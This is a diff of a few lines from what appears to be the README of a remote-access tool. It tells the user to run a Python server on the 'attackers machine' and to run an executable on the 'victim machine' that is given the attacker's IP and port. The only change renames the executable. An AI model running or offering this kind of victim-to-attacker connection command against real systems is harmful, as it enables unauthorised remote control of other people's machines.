@@ -17,7 +17,7 @@ On the attackers machine use the python server
 
 On the victim machine, either alter the source so no arguments are required or run the below:
 
-`hacksocktls.exe [attackers IP] [port]`
+`hacksock.exe [attackers IP] [port]`
 
 # Bugs:
 
